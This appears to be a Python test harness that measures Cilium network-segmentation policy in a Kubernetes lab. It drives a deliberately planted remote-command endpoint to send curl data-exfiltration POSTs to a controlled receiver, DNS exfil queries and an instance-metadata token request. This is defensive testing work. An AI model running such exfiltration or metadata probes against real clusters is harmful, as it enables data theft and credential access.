#!/usr/bin/env python3
"""Scenario runner: the before/after connectivity matrix, with receipts.

One invocation runs the whole experiment against the current kube context:

  1. preconditions  Cilium + Hubble healthy, foothold RBAC is minimal, the
                    planted RCE answers.
  2. baseline       apply policy/baseline, run every scenario.
  3. hardened       apply policy/hardened, run every scenario again.
  4. reschedule     move the frontend, api and db pods to the other node (new IPs), record
                    their Cilium identities, run every scenario a third time.
  5. report         JSON + Markdown under evidence/<run-id>/, plus every Hubble
                    flow observed during each profile.

Only policy objects change between steps 2 and 3 (ADR-0002). The status
taxonomy is the one eks-attack-range uses:

  attack scenarios   exploitable | blocked | error | skipped
  legitimate flows   allowed | broken | error

Rules that keep a "blocked" honest:
  * A hardened result can only be "blocked" if the same run's baseline was
    "exploitable" for that scenario. A failed or skipped baseline proves nothing.
  * The destination must pass a health check that does not cross the network
    (kubectl exec into the destination itself) at the time of the probe.
  * The denial must carry evidence from the layer that enforced it: a Hubble
    DROPPED / POLICY_DENIED flow for L3/L4, an HTTP 403 plus a Hubble L7 drop
    for HTTP, a REFUSED rcode plus a Hubble DNS-proxy drop for DNS. A timeout
    with no matching evidence is "error", never "blocked".
  * Exfil success is judged at the receiver, never by the client's exit code.

Stdlib only. Needs kubectl, hubble and cilium on PATH.
"""
from __future__ import annotations

import argparse
import datetime as dt
import gzip
import json
import os
import secrets
import shutil
import signal
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
LAB_NAMESPACES = ["frontend", "backend", "sensitive"]
FQDN_API = "api.backend.svc.cluster.local"
FQDN_SENSITIVE = "sensitive.sensitive.svc.cluster.local"
FQDN_EXFIL = "exfil.egress-sim.svc.cluster.local"
EXFIL_ZONE = "exfil.lab.test"
SENSITIVE_MARKER = "SYNTHETIC-SENSITIVE-RECORD"
EXPORT_MARKER = "SYNTHETIC-BULK-EXPORT"
IMDS = "169.254.169.254"
INTERNET_PROBE = "https://example.com/"
FOOTHOLD_SA = "system:serviceaccount:frontend:frontend"


# --------------------------------------------------------------------------- #
# plumbing
# --------------------------------------------------------------------------- #

def now() -> dt.datetime:
    return dt.datetime.now(dt.timezone.utc)


def iso(t: dt.datetime) -> str:
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def sh(args: list[str], timeout: int = 60, check: bool = False) -> subprocess.CompletedProcess:
    p = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
    if check and p.returncode != 0:
        raise RuntimeError(f"{' '.join(args)} failed: {p.stderr.strip()}")
    return p


def kubectl(*args: str, timeout: int = 60, check: bool = False) -> subprocess.CompletedProcess:
    return sh(["kubectl", *args], timeout=timeout, check=check)


def log(msg: str) -> None:
    print(f"[{now().strftime('%H:%M:%S')}] {msg}", flush=True)


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class PortForward:
    """kubectl port-forward to the frontend Service: the attacker's channel into
    the planted RCE. Port-forward enters the pod's network namespace through the
    kubelet, so it is not subject to pod-network policy. That is deliberate: the
    lab assumes the foothold and measures what it can reach, not how it got in."""

    def __init__(self) -> None:
        self.port = free_port()
        self.proc: subprocess.Popen | None = None

    def __enter__(self) -> "PortForward":
        self.proc = subprocess.Popen(
            ["kubectl", "-n", "frontend", "port-forward", "deploy/frontend", f"{self.port}:8080"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        for _ in range(40):
            try:
                with socket.create_connection(("127.0.0.1", self.port), timeout=1):
                    return self
            except OSError:
                time.sleep(0.25)
        raise RuntimeError("port-forward to the frontend never came up")

    def __exit__(self, *exc) -> None:
        if self.proc:
            self.proc.send_signal(signal.SIGTERM)
            self.proc.wait(timeout=10)

    def rce(self, cmd: str, timeout: int = 25) -> dict:
        req = urllib.request.Request(
            f"http://127.0.0.1:{self.port}/run",
            data=json.dumps({"cmd": cmd}).encode(),
            headers={"Content-Type": "application/json"},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read())
        except Exception as e:  # noqa: BLE001 - every failure is reported, not raised
            return {"rc": -1, "stdout": "", "stderr": f"rce channel error: {e}"}


class HubbleRelay:
    """`cilium hubble port-forward` for the duration of the run."""

    def __enter__(self) -> "HubbleRelay":
        self.proc = subprocess.Popen(
            ["cilium", "hubble", "port-forward"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        for _ in range(60):
            if sh(["hubble", "status"], timeout=10).returncode == 0:
                return self
            time.sleep(0.5)
        raise RuntimeError("hubble relay not reachable on localhost:4245")

    def __exit__(self, *exc) -> None:
        self.proc.send_signal(signal.SIGTERM)
        self.proc.wait(timeout=10)


def hubble_flows(since: dt.datetime, until: dt.datetime) -> tuple[list[dict], int]:
    """Every flow in the window, plus the count of lost events Hubble reported.
    Lost events are recorded as a collection gap, never silently ignored."""
    p = sh(
        ["hubble", "observe", "--since", iso(since - dt.timedelta(seconds=2)),
         "--until", iso(until + dt.timedelta(seconds=2)), "-o", "json"],
        timeout=120,
    )
    flows, lost = [], 0
    for line in p.stdout.splitlines():
        try:
            rec = json.loads(line)
        except json.JSONDecodeError:
            continue
        if "lost_events" in rec:
            lost += int(rec["lost_events"].get("num_events_lost", 0))
        if "flow" in rec:
            flows.append(rec["flow"])
    return flows, lost


def pod_of(ns: str, app: str) -> str:
    """The live pod for an app. A terminating pod still reports phase Running,
    so pods with a deletionTimestamp are skipped explicitly."""
    items = json.loads(kubectl("-n", ns, "get", "pod", "-l", f"app={app}", "-o", "json").stdout or "{}")
    live = [i["metadata"]["name"] for i in items.get("items", [])
            if i["status"].get("phase") == "Running" and not i["metadata"].get("deletionTimestamp")]
    return live[0] if live else ""


def svc_ip(ns: str, name: str) -> str:
    return kubectl("-n", ns, "get", "svc", name, "-o", "jsonpath={.spec.clusterIP}").stdout.strip()


def exec_in(ns: str, app: str, *cmd: str, timeout: int = 20) -> subprocess.CompletedProcess:
    return kubectl("-n", ns, "exec", f"deploy/{app}", "--", *cmd, timeout=timeout)


def healthy(ns: str, app: str, port: int = 8080) -> bool:
    """Destination health from inside the destination itself, so the check can
    never be confused by the policy under test."""
    if app == "db":
        code = "import socket;s=socket.create_connection(('127.0.0.1',5432),3);s.sendall(b'PING\\n');print(s.recv(8).decode())"
        return "PONG" in exec_in(ns, app, "python3", "-c", code).stdout
    return exec_in(ns, app, "curl", "-sf", "-m", "3", f"http://127.0.0.1:{port}/healthz").returncode == 0


def received_markers(app: str) -> list[str]:
    p = exec_in("egress-sim", app, "curl", "-s", "-m", "3", "http://127.0.0.1:8080/markers")
    try:
        return [m["marker"] for m in json.loads(p.stdout)["markers"]]
    except (json.JSONDecodeError, KeyError):
        return []


# --------------------------------------------------------------------------- #
# evidence matchers (one per enforcement layer)
# --------------------------------------------------------------------------- #

def _ep(flow: dict, side: str) -> dict:
    return flow.get(side) or {}


def _l4(flow: dict) -> tuple[str, int | None]:
    """(protocol, destination_port) from a flow's L4 block, or ("", None)."""
    for proto, v in (flow.get("l4") or {}).items():
        if isinstance(v, dict):
            return proto.upper(), v.get("destination_port")
    return "", None


def _src_matches(f: dict, src_pod_prefix: str, src_ns: str) -> bool:
    s = _ep(f, "source")
    if not s.get("pod_name", "").startswith(src_pod_prefix):
        return False
    # Namespace pins the drop to the foothold's own identity, not any workload
    # that merely shares a pod-name prefix. Cilium carries it on the endpoint and
    # also as a k8s:io.kubernetes.pod.namespace label.
    ns = s.get("namespace", "")
    if not ns:
        labels = s.get("labels", [])
        ns = next((lbl.split("=", 1)[1] for lbl in labels
                   if lbl.startswith("k8s:io.kubernetes.pod.namespace=")), "")
    return ns == src_ns


def l34_drops(flows: list[dict], src_pod_prefix: str, dst: str,
              src_ns: str = "frontend", dst_port: int | None = None,
              proto: str | None = None) -> list[dict]:
    """Hubble L3/L4 policy drops from the foothold to a destination.

    A flow counts only if it is a POLICY drop, from a pod with the foothold's
    name prefix AND in the foothold's namespace, to the named destination (pod
    name prefix or IP), and — when given — on the expected protocol and port. The
    identity, destination and port together stop an unrelated drop from standing
    in as evidence for this row.
    """
    out = []
    for f in flows:
        if f.get("verdict") != "DROPPED":
            continue
        if not _src_matches(f, src_pod_prefix, src_ns):
            continue
        dpod = _ep(f, "destination").get("pod_name", "")
        dip = (f.get("IP") or {}).get("destination", "")
        if not (dpod.startswith(dst) or dip == dst):
            continue
        fproto, fport = _l4(f)
        if dst_port is not None and fport != dst_port:
            continue
        if proto is not None and fproto != proto.upper():
            continue
        # POLICY_DENIED (default deny) or POLICY_DENY (explicit egressDeny).
        # Any other drop reason is not evidence that policy did the work.
        if "POLICY" in f.get("drop_reason_desc", ""):
            out.append(f)
    return out


def l7_http_drops(flows: list[dict], method: str, path: str,
                  src_pod_prefix: str = "frontend-", src_ns: str = "frontend",
                  dst_pod_prefix: str = "api-", dst_ns: str = "backend",
                  dst_port: int | None = 8080) -> list[dict]:
    """L7 HTTP policy drops for one method+path, pinned to the foothold identity
    and the real destination workload, not just any dropped request anywhere."""
    out = []
    for f in flows:
        if f.get("verdict") != "DROPPED":
            continue
        http = (f.get("l7") or {}).get("http") or {}
        if http.get("method") != method or path not in http.get("url", ""):
            continue
        if not _src_matches(f, src_pod_prefix, src_ns):
            continue
        d = _ep(f, "destination")
        if not d.get("pod_name", "").startswith(dst_pod_prefix):
            continue
        if dst_ns and d.get("namespace", "") not in ("", dst_ns):
            continue
        _, fport = _l4(f)
        if dst_port is not None and fport not in (None, dst_port):
            continue
        # An L7 HTTP drop is the proxy's own verdict: Hubble records it as
        # verdict=DROPPED with no drop_reason_desc (the reason field is for the
        # datapath L3/L4 drops). So the DROPPED verdict on the matched
        # method+path+identity is the enforcement evidence; we do not demand a
        # "POLICY" reason here, because the proxy never sets one.
        out.append(f)
    return out


def dns_proxy_drops(flows: list[dict], marker: str,
                    src_pod_prefix: str = "frontend-", src_ns: str = "frontend") -> list[dict]:
    """DNS-proxy drops for this run's marker query, from the foothold identity.

    Like L7 HTTP, a DNS-proxy denial is recorded as verdict=DROPPED with no
    drop_reason_desc, so the marker query + foothold identity + DROPPED verdict
    is the evidence. The per-run marker is what ties the drop to this probe.
    """
    if not marker:
        # No per-run marker means no way to tie a drop to this probe. Return
        # nothing rather than let an empty substring match every DNS drop.
        return []
    out = []
    for f in flows:
        if f.get("verdict") != "DROPPED":
            continue
        dns = (f.get("l7") or {}).get("dns") or {}
        if marker not in dns.get("query", ""):
            continue
        if not _src_matches(f, src_pod_prefix, src_ns):
            continue
        out.append(f)
    return out


def exemplar(f: dict) -> dict:
    """Sanitized single-flow summary for the report."""
    l7 = f.get("l7") or {}
    l4 = f.get("l4") or {}
    port = next((v.get("destination_port") for v in l4.values() if isinstance(v, dict)), None)
    out = {
        "time": f.get("time"),
        "verdict": f.get("verdict"),
        "drop_reason": f.get("drop_reason_desc"),
        "type": f.get("Type"),
        "src": f"{_ep(f, 'source').get('namespace', '')}/{_ep(f, 'source').get('pod_name', '')}".strip("/"),
        "src_identity": _ep(f, "source").get("identity"),
        "dst": (f"{_ep(f, 'destination').get('namespace', '')}/{_ep(f, 'destination').get('pod_name', '')}".strip("/")
                or (f.get("IP") or {}).get("destination")),
        "dst_identity": _ep(f, "destination").get("identity"),
        "dst_port": port,
        "node": f.get("node_name"),
    }
    if l7.get("http"):
        out["http"] = f"{l7['http'].get('method')} {l7['http'].get('url')}"
    if l7.get("dns"):
        out["dns_query"] = l7["dns"].get("query")
    return out


# --------------------------------------------------------------------------- #
# scenarios
# --------------------------------------------------------------------------- #

SCENARIOS = [
    # id, title, kind, layer, matrix row?, expected baseline, expected hardened
    ("frontend-to-api", "Frontend to permitted backend route (GET /api/orders)", "legit", "L7", True, "Allowed", "Allowed"),
    ("api-to-db", "Backend to database", "legit", "L3/L4", True, "Allowed", "Allowed"),
    ("frontend-to-sensitive", "Frontend to sensitive service", "attack", "L3/L4", True, "Allowed", "Denied"),
    ("http-exfil", "Frontend to controlled exfil receiver", "attack", "L3/L4", True, "Received", "Denied"),
    ("dns-exfil", "Synthetic DNS marker to authoritative receiver", "attack", "DNS", True, "Received", "Denied"),
    ("forbidden-http", "Frontend to forbidden backend HTTP operation (POST /api/admin/export)", "attack", "L7", True, "Allowed", "Denied"),
    ("metadata", "Frontend reaches instance metadata (prerequisite probe, T1552.005)", "attack", "L3/L4", False, "Allowed", "Denied"),
    ("internet-egress", "Frontend to public internet (example.com:443)", "attack", "L3/L4", False, "Allowed", "Denied"),
]


class Profile:
    def __init__(self, name: str, run_id: str, pf: PortForward, baseline: dict | None) -> None:
        self.name, self.run_id, self.pf = name, run_id, pf
        self.baseline = baseline or {}
        self.results: dict[str, dict] = {}

    # Each probe returns (reached, detail, layer_evidence_fn) where the evidence
    # function is evaluated later against the profile's exported flows.

    def probe(self, sid: str) -> dict:
        t0 = now()
        fn = getattr(self, "p_" + sid.replace("-", "_"))
        res = fn()
        res["window"] = [iso(t0), iso(now())]
        return res

    def p_frontend_to_api(self) -> dict:
        ok = healthy("backend", "api")
        r = self.pf.rce(f"curl -s -m 5 -o /dev/null -w '%{{http_code}}' http://{FQDN_API}:8080/api/orders")
        return {"healthy": ok, "reached": r["stdout"].strip() == "200",
                "client": {"rc": r["rc"], "http_code": r["stdout"].strip()}}

    def p_api_to_db(self) -> dict:
        ok = healthy("backend", "db")
        code = ("import socket;s=socket.create_connection(('db.backend.svc.cluster.local',5432),4);"
                "s.sendall(b'PING\\n');print(s.recv(8).decode().strip())")
        p = exec_in("backend", "api", "python3", "-c", code)
        return {"healthy": ok, "reached": p.stdout.strip() == "PONG",
                "client": {"rc": p.returncode, "reply": p.stdout.strip(), "stderr": p.stderr.strip()[-160:]}}

    def p_frontend_to_sensitive(self) -> dict:
        ok = healthy("sensitive", "sensitive")
        ip = svc_ip("sensitive", "sensitive")
        by_name = self.pf.rce(f"curl -s -m 5 http://{FQDN_SENSITIVE}:8080/")
        # By ClusterIP too: an attacker who learned the address does not need DNS.
        by_ip = self.pf.rce(f"curl -s -m 5 http://{ip}:8080/")
        reached = SENSITIVE_MARKER in by_name["stdout"] or SENSITIVE_MARKER in by_ip["stdout"]
        return {"healthy": ok, "reached": reached, "dst": "sensitive-",
                "client": {"by_name_rc": by_name["rc"], "by_ip_rc": by_ip["rc"], "cluster_ip": ip}}

    def p_http_exfil(self) -> dict:
        ok = healthy("egress-sim", "exfil")
        marker = f"netseg-{self.run_id}-{self.name}-http-{secrets.token_hex(3)}"
        ip = svc_ip("egress-sim", "exfil")
        a = self.pf.rce(f"curl -s -m 5 -X POST -d {marker}-name http://{FQDN_EXFIL}:8080/collect")
        b = self.pf.rce(f"curl -s -m 5 -X POST -d {marker}-ip http://{ip}:8080/collect")
        time.sleep(1)
        got = [m for m in received_markers("exfil") if m.startswith(marker)]
        return {"healthy": ok, "reached": bool(got), "dst": "exfil-", "marker": marker,
                "client": {"by_name_rc": a["rc"], "by_ip_rc": b["rc"], "received_at_receiver": got}}

    def p_dns_exfil(self) -> dict:
        ok = healthy("egress-sim", "dns")
        label = f"m{secrets.token_hex(4)}-{self.name}"
        q = f"{label}.{EXFIL_ZONE}."
        via_resolver = self.pf.rce(f"dig +time=3 +tries=1 {q} A")
        status = next((ln.split("status:")[1].split(",")[0].strip()
                       for ln in via_resolver["stdout"].splitlines() if "status:" in ln), "none")
        # Destination filtering, tested separately from query-name filtering
        # (ADR-0004): send the same kind of query straight to the receiver.
        ip = svc_ip("egress-sim", "dns")
        direct = self.pf.rce(f"dig +time=3 +tries=1 @{ip} {label}-direct.{EXFIL_ZONE}. A")
        time.sleep(1)
        got = [m for m in received_markers("dns") if m.startswith(label)]
        return {"healthy": ok, "reached": bool(got), "dst": "dns-", "marker": label,
                "client": {"resolver_status": status, "direct_rc": direct["rc"],
                           "direct_timed_out": "timed out" in direct["stdout"],
                           "received_at_receiver": got}}

    def p_forbidden_http(self) -> dict:
        ok = healthy("backend", "api")
        r = self.pf.rce(f"curl -s -m 5 -w '\\n%{{http_code}}' -X POST http://{FQDN_API}:8080/api/admin/export")
        body, _, code = r["stdout"].rpartition("\n")
        return {"healthy": ok, "reached": code.strip() == "200" and EXPORT_MARKER in body,
                "client": {"rc": r["rc"], "http_code": code.strip(), "body": body.strip()[:60]}}

    def p_metadata(self) -> dict:
        # Reachability only. The IMDSv2 token request proves the endpoint answers
        # from the pod network; the token itself is discarded (-o /dev/null) and
        # no credential path is ever requested. Network access != credential theft.
        r = self.pf.rce(
            f"curl -s -m 4 -o /dev/null -w '%{{http_code}}' -X PUT http://{IMDS}/latest/api/token "
            "-H 'X-aws-ec2-metadata-token-ttl-seconds: 60'")
        return {"healthy": True, "reached": r["stdout"].strip() == "200", "dst": IMDS,
                "environmental": True,
                "client": {"rc": r["rc"], "http_code": r["stdout"].strip()}}

    def p_internet_egress(self) -> dict:
        r = self.pf.rce(f"curl -s -m 6 -o /dev/null -w '%{{http_code}}' {INTERNET_PROBE}")
        code = r["stdout"].strip()
        return {"healthy": True, "reached": code[:1] in ("2", "3"), "dst": "world",
                "environmental": True, "client": {"rc": r["rc"], "http_code": code}}


def evidence_for(sid: str, res: dict, flows: list[dict]) -> list[dict]:
    t0 = dt.datetime.fromisoformat(res["window"][0].replace("Z", "+00:00")) - dt.timedelta(seconds=3)
    t1 = dt.datetime.fromisoformat(res["window"][1].replace("Z", "+00:00")) + dt.timedelta(seconds=3)

    def in_window(f: dict) -> bool:
        try:
            t = dt.datetime.fromisoformat(f["time"].replace("Z", "+00:00"))
        except (KeyError, ValueError):
            return False
        return t0 <= t <= t1

    w = [f for f in flows if in_window(f)]
    if sid == "forbidden-http":
        return l7_http_drops(w, "POST", "/api/admin/export")
    if sid == "dns-exfil":
        return (dns_proxy_drops(w, res["marker"])
                + l34_drops(w, "frontend-", "dns-", dst_port=53, proto="UDP"))
    if sid == "internet-egress":
        return [f for f in w if f.get("verdict") == "DROPPED"
                and _src_matches(f, "frontend-", "frontend")
                and "POLICY" in f.get("drop_reason_desc", "")
                and "world" in " ".join(_ep(f, "destination").get("labels", []))]
    # L3/L4 attack rows carry a known destination port on TCP.
    port = {"frontend-to-sensitive": 8080, "http-exfil": 8080, "metadata": 80}.get(sid)
    return l34_drops(w, "frontend-", res.get("dst", ""), dst_port=port, proto="TCP")


def classify(sid: str, kind: str, layer: str, profile: str, res: dict,
             evidence: list[dict], baseline_status: str | None,
             collection_gap: bool = False) -> tuple[str, str]:
    if not res.get("healthy"):
        return "error", "destination failed its in-pod health check at probe time"
    if kind == "legit":
        return ("allowed", "legitimate flow succeeded") if res["reached"] else \
               ("broken", "legitimate flow failed; segmentation broke the app")
    if res["reached"]:
        return "exploitable", "attacker reached the destination"
    if profile == "baseline":
        if res.get("environmental"):
            return "skipped", "not reachable even with permissive policy in this environment; cannot measure a defense"
        return "error", "baseline did not reach the destination; a hardened result would prove nothing"
    if baseline_status != "exploitable":
        return "skipped", f"baseline was '{baseline_status}', so no defense can be claimed"
    if not evidence:
        return "error", "not reached, but no enforcement evidence from the expected layer (timeout or collection gap)"
    if layer == "L7" and res["client"].get("http_code") != "403":
        return "error", "L7 drop recorded but the client did not see HTTP 403"
    if sid == "dns-exfil" and res["client"].get("resolver_status") != "REFUSED":
        return "error", "DNS-proxy drop recorded but the client did not see REFUSED"
    if collection_gap:
        # Hubble reported lost events during the run. We found a matching drop,
        # but with telemetry gaps we cannot certify that no flow also slipped
        # through, so we do not claim a defense. Honest error, never a pass.
        return "error", "enforcement evidence found but Hubble reported lost events in the run; cannot certify the drop is complete"
    return "blocked", f"denied with {layer} enforcement evidence ({len(evidence)} matching flows)"


def display(kind: str, status: str, expected_hardened: str, res: dict) -> str:
    if status in ("error", "skipped"):
        return status
    if kind == "legit":
        return "Allowed" if status == "allowed" else "Denied"
    if status == "exploitable":
        return "Received" if expected_hardened == "Denied" and "marker" in res else "Allowed"
    return "Denied"


def run_profile(name: str, run_id: str, baseline: dict | None, outdir: Path) -> dict:
    log(f"profile {name}: probing")
    started = now()
    with PortForward() as pf:
        rce_ok = pf.rce("id -u")
        prof = Profile(name, run_id, pf, baseline)
        raw = {}
        for sid, *_ in SCENARIOS:
            raw[sid] = prof.probe(sid)
            log(f"  {sid}: reached={raw[sid]['reached']}")
    time.sleep(3)
    flows, lost = hubble_flows(started, now())
    with gzip.open(outdir / f"flows-{name}.jsonl.gz", "wt") as fh:
        for f in flows:
            if any(ns in json.dumps(f.get("source", {})) + json.dumps(f.get("destination", {}))
                   for ns in LAB_NAMESPACES + ["egress-sim"]):
                fh.write(json.dumps(f) + "\n")

    results = {}
    for sid, title, kind, layer, matrix, exp_b, exp_h in SCENARIOS:
        res = raw[sid]
        ev = evidence_for(sid, res, flows) if kind == "attack" else []
        b_status = (baseline or {}).get(sid, {}).get("status")
        if rce_ok.get("rc") != 0:
            status, why = "error", "planted RCE did not answer; foothold unavailable"
        else:
            status, why = classify(sid, kind, layer, name, res, ev, b_status,
                                   collection_gap=lost > 0)
        expected = exp_b if name == "baseline" else exp_h
        shown = display(kind, status, exp_h, res)
        results[sid] = {
            "title": title, "kind": kind, "layer": layer, "matrix": matrix,
            "status": status, "reason": why, "expected": expected, "observed": shown,
            "pass": shown == expected or (status == "skipped" and not matrix),
            "window": res["window"], "client": res["client"],
            "evidence": {"matching_flows": len(ev), "exemplar": exemplar(ev[0]) if ev else None},
        }
    return {"profile": name, "started": iso(started), "finished": iso(now()),
            "rce_answers": rce_ok.get("rc") == 0, "hubble": {"flows": len(flows), "lost_events": lost},
            "results": results}


# --------------------------------------------------------------------------- #
# experiment steps
# --------------------------------------------------------------------------- #

def apply_policy(profile: str) -> None:
    """Replace every policy object in the lab namespaces with the profile's
    set. Nothing else in the cluster is touched (ADR-0002)."""
    for ns in LAB_NAMESPACES:
        kubectl("-n", ns, "delete", "ciliumnetworkpolicies,networkpolicies", "--all", "--wait=true", timeout=60)
    kubectl("apply", "-f", str(ROOT / "policy" / profile), check=True)
    # Policy is realized asynchronously per endpoint, so give the agents a fixed
    # settle time. An unrealized policy cannot produce a false "blocked": the
    # classifier demands matching enforcement evidence, and the legitimate flows
    # would show it as "broken".
    time.sleep(8)


def preconditions() -> dict:
    checks = {}
    st = sh(["cilium", "status", "--wait", "--wait-duration", "2m"], timeout=180)
    checks["cilium_ready"] = st.returncode == 0
    checks["hubble_ready"] = sh(["hubble", "status"], timeout=20).returncode == 0
    ver = kubectl("-n", "kube-system", "get", "ds", "cilium", "-o",
                  "jsonpath={.spec.template.spec.containers[0].image}").stdout
    checks["cilium_image"] = ver.split("@")[0]
    # The foothold must not be able to rewrite the rules it is measured against.
    denies = {
        "create ciliumnetworkpolicies.cilium.io -n frontend": ["create", "ciliumnetworkpolicies.cilium.io", "-n", "frontend"],
        "delete networkpolicies -n frontend": ["delete", "networkpolicies", "-n", "frontend"],
        "patch pods -n frontend (relabel itself)": ["patch", "pods", "-n", "frontend"],
        "patch pods -n backend": ["patch", "pods", "-n", "backend"],
        "create pods -n backend": ["create", "pods", "-n", "backend"],
    }
    rbac = {}
    for label, args in denies.items():
        out = kubectl("auth", "can-i", *args, f"--as={FOOTHOLD_SA}").stdout.strip()
        rbac[label] = out
    checks["foothold_rbac"] = rbac
    checks["foothold_rbac_minimal"] = all(v == "no" for v in rbac.values())
    with PortForward() as pf:
        tok = pf.rce("test -e /var/run/secrets/kubernetes.io/serviceaccount/token && echo mounted || echo absent")
        checks["foothold_token"] = tok["stdout"].strip()
        checks["rce_uid"] = pf.rce("id -u")["stdout"].strip()
    return checks


def identities() -> list[dict]:
    rows = []
    for ns, app in (("frontend", "frontend"), ("backend", "api"), ("backend", "db")):
        pod = pod_of(ns, app)
        cep = json.loads(kubectl("-n", ns, "get", "ciliumendpoint", pod, "-o", "json").stdout or "{}")
        st = cep.get("status", {})
        addr = (st.get("networking", {}).get("addressing") or [{}])[0]
        rows.append({"workload": f"{ns}/{app}", "pod": pod,
                     "ip": addr.get("ipv4"), "node": st.get("networking", {}).get("node"),
                     "identity": st.get("identity", {}).get("id")})
    return rows


def reschedule() -> tuple[list[dict], list[dict]]:
    """Replace the frontend, api and db pods AND move each to the other node.

    A plain restart is not enough: kind's host-scope IPAM can hand a new pod the
    address its predecessor just released on the same node, and then "the policy
    still works with a new IP" is unproven (this happened on a real run). Moving
    every workload to the opposite lab.node/slot lands each pod in a different
    pod CIDR, so the IP must change, and the permitted chain still crosses nodes
    (frontend and db swap to one node, api to the other). Only placement
    changes here; the hardened policy objects are untouched.
    """
    before = identities()
    for ns, app in (("frontend", "frontend"), ("backend", "api"), ("backend", "db")):
        cur = kubectl("-n", ns, "get", "deploy", app, "-o",
                      "jsonpath={.spec.template.spec.nodeSelector.lab\\.node/slot}").stdout.strip()
        nxt = "b" if cur == "a" else "a"
        patch = json.dumps({"spec": {"template": {"spec": {"nodeSelector": {"lab.node/slot": nxt}}}}})
        kubectl("-n", ns, "patch", "deploy", app, "--type=strategic", "-p", patch, check=True)
    for ns, app in (("frontend", "frontend"), ("backend", "api"), ("backend", "db")):
        kubectl("-n", ns, "rollout", "status", f"deploy/{app}", "--timeout=180s", timeout=200, check=True)
    # Wait until every old pod is actually gone, so the receipt cannot read a
    # terminating predecessor and so the old endpoints are out of the picture.
    for row in before:
        ns = row["workload"].split("/")[0]
        kubectl("-n", ns, "wait", "--for=delete", f"pod/{row['pod']}", "--timeout=120s", timeout=140)
    time.sleep(10)
    after = identities()
    return before, after


# --------------------------------------------------------------------------- #
# report
# --------------------------------------------------------------------------- #

def write_report(outdir: Path, doc: dict) -> None:
    (outdir / "report.json").write_text(json.dumps(doc, indent=2) + "\n")
    P = {p["profile"]: p for p in doc["profiles"]}
    L = []
    L.append(f"# Connectivity matrix: run `{doc['run_id']}`\n")
    L.append(f"- Context: `{doc['context']}`  ")
    L.append(f"- Cilium: `{doc['preconditions']['cilium_image']}`  ")
    L.append(f"- Started {doc['started']}, finished {doc['finished']}  ")
    L.append(f"- Overall: **{'PASS' if doc['pass'] else 'FAIL'}**\n")
    L.append("Only policy objects changed between the baseline and hardened columns. "
             "The reschedule column re-runs the hardened profile after the frontend, api "
             "and db pods were replaced and moved to the other node (new IPs, same Cilium identities).\n")
    L.append("| Test | Baseline | Hardened | After reschedule | Enforcement evidence (hardened) |")
    L.append("| ---- | -------- | -------- | ---------------- | ------------------------------- |")
    for sid, title, kind, layer, matrix, *_ in SCENARIOS:
        if not matrix:
            continue
        b, h, r = (P[x]["results"][sid] for x in ("baseline", "hardened", "reschedule"))
        L.append(f"| {title} | {b['observed']} | {h['observed']} | {r['observed']} | {evidence_cell(h)} |")
    L.append("\n## Supplemental probes\n")
    L.append("Environment dependent: on kind there is no instance metadata service, so the "
             "metadata probe reports `skipped` rather than a false \"defended\". The live EKS "
             "run is where it is measured.\n")
    L.append("| Probe | Baseline | Hardened | After reschedule | Reason (hardened) |")
    L.append("| ----- | -------- | -------- | ---------------- | ----------------- |")
    for sid, title, kind, layer, matrix, *_ in SCENARIOS:
        if matrix:
            continue
        b, h, r = (P[x]["results"][sid] for x in ("baseline", "hardened", "reschedule"))
        L.append(f"| {title} | {b['observed']} | {h['observed']} | {r['observed']} | {h['reason']} |")

    L.append("\n## Reschedule receipt (identity, not IP)\n")
    L.append("| Workload | IP before | IP after | Node before | Node after | Identity before | Identity after |")
    L.append("| -------- | --------- | -------- | ----------- | ---------- | --------------- | -------------- |")
    for b, a in zip(doc["reschedule"]["before"], doc["reschedule"]["after"]):
        L.append(f"| {b['workload']} | {b['ip']} | {a['ip']} | {b['node']} | {a['node']} | {b['identity']} | {a['identity']} |")
    L.append(f"\nEvery workload moved to the other node: **{doc['reschedule']['nodes_changed']}**. "
             f"IPs changed for every workload: **{doc['reschedule']['ips_changed']}**. "
             f"Identities unchanged: **{doc['reschedule']['identities_stable']}**. "
             f"Hardened results identical after reschedule: **{doc['reschedule']['results_identical']}**.\n")

    L.append("## Preconditions\n")
    pc = doc["preconditions"]
    L.append(f"- Cilium ready: {pc['cilium_ready']}, Hubble ready: {pc['hubble_ready']}")
    L.append(f"- Planted RCE answers as uid {pc['rce_uid']}; ServiceAccount token in the foothold: {pc['foothold_token']}")
    L.append("- Foothold RBAC (`kubectl auth can-i --as " + FOOTHOLD_SA + "`):")
    for k, v in pc["foothold_rbac"].items():
        L.append(f"  - {k}: `{v}`")

    L.append("\n## Collection\n")
    for p in doc["profiles"]:
        gap = p["hubble"]["lost_events"]
        L.append(f"- {p['profile']}: {p['hubble']['flows']} Hubble flows exported "
                 f"(`flows-{p['profile']}.jsonl.gz`), lost events: {gap}"
                 + (" **(collection gap, see note)**" if gap else ""))

    L.append("\n## Per-scenario detail\n")
    for p in doc["profiles"]:
        L.append(f"### {p['profile']}\n")
        L.append("| Scenario | Status | Expected | Observed | Reason |")
        L.append("| -------- | ------ | -------- | -------- | ------ |")
        for sid, r in p["results"].items():
            L.append(f"| `{sid}` | {r['status']} | {r['expected']} | {r['observed']} | {r['reason']} |")
        L.append("")
    (outdir / "report.md").write_text("\n".join(L) + "\n")


def evidence_cell(r: dict) -> str:
    ex = r["evidence"]["exemplar"]
    if r["kind"] == "legit":
        c = r["client"]
        return f"still passes (HTTP {c['http_code']})" if "http_code" in c else f"still passes ({c.get('reply')})"
    if not ex:
        return r["reason"]
    if r["layer"] == "L7":
        return f"HTTP {r['client']['http_code']}; Hubble L7 {ex['verdict']} `{ex.get('http')}`"
    if r["layer"] == "DNS":
        return (f"`{r['client']['resolver_status']}`; Hubble DNS proxy {ex['verdict']}; "
                f"direct query to receiver timed out: {r['client']['direct_timed_out']}")
    return (f"Hubble {ex['verdict']} {ex['drop_reason']}, identity {ex['src_identity']} "
            f"to {ex['dst_identity']} port {ex['dst_port']}")


def main() -> int:
